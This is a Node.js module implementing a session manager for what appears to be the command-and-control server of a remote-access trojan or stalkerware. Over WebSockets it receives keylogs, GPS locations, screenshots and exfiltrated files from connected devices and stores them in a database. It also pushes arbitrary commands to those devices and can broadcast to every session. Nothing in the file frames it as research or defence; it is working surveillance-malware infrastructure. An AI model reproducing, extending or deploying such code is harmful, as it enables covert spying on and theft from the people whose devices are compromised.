const crypto = require('crypto');
const WebSocket = require('ws');
const database = require('./database');

class SessionManager {
    constructor() {
        this.sessions = new Map(); // userId -> activeSessionId
        this.wsConnections = new Map(); // sessionId -> ws
    }
    
    setActiveSession(userId, sessionId) {
        this.sessions.set(userId.toString(), sessionId);
    }
    
    getActiveSession(userId) {
        return this.sessions.get(userId.toString());
    }
    
    registerWebSocket(sessionId, ws) {
        this.wsConnections.set(sessionId, ws);
        
        ws.on('message', async (data) => {
            try {
                const message = JSON.parse(data);
                await this.handleDeviceMessage(sessionId, message);
            } catch (error) {
                console.error('WebSocket message error:', error);
            }
        });
        
        ws.on('close', () => {
            this.wsConnections.delete(sessionId);
        });
    }
    
    async handleDeviceMessage(sessionId, message) {
        const { type, data } = message;
        
        switch(type) {
            case 'connect':
                await database.addSession(sessionId, data);
                break;
            case 'command_result':
                await database.updateCommandResult(data.commandId, data.result);
                break;
            case 'data':
                await database.saveExtractedData(sessionId, data.type, data.content);
                break;
            case 'keylog':
                await database.addKeylog(sessionId, data);
                break;
            case 'location':
                await database.addLocation(sessionId, data.latitude, data.longitude);
                break;
            case 'screenshot':
                await database.saveScreenshot(sessionId, data.path, data.thumbnail);
                break;
            case 'file':
                await database.saveExtractedFile(sessionId, data.path, data.content);
                break;
        }
    }
    
    async executeCommand(sessionId, command, params = {}) {
        const ws = this.wsConnections.get(sessionId);
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            throw new Error('Device not connected');
        }
        
        const commandId = crypto.randomBytes(8).toString('hex');
        
        await database.addCommand(sessionId, command, command, params);
        
        return new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
                reject(new Error('Command timeout'));
            }, 30000);
            
            const messageHandler = async (data) => {
                try {
                    const response = JSON.parse(data);
                    if (response.commandId === commandId) {
                        ws.removeListener('message', messageHandler);
                        clearTimeout(timeout);
                        await database.updateCommandResult(commandId, response.result);
                        resolve(response.result);
                    }
                } catch (error) {
                    // Ignore parse errors
                }
            };
            
            ws.on('message', messageHandler);
            
            ws.send(JSON.stringify({
                commandId,
                action: command,
                params
            }));
        });
    }
    
    async broadcastToAll(message) {
        const promises = [];
        for (const [sessionId, ws] of this.wsConnections) {
            if (ws.readyState === WebSocket.OPEN) {
                promises.push(ws.send(JSON.stringify(message)));
            }
        }
        await Promise.all(promises);
    }
    
    async disconnectSession(sessionId) {
        const ws = this.wsConnections.get(sessionId);
        if (ws) {
            ws.close();
            this.wsConnections.delete(sessionId);
        }
        await database.killSession(sessionId);
    }
    
    getActiveSessions() {
        return Array.from(this.wsConnections.keys());
    }
    
    isConnected(sessionId) {
        const ws = this.wsConnections.get(sessionId);
        return ws && ws.readyState === WebSocket.OPEN;
    }
}

module.exports = new SessionManager();
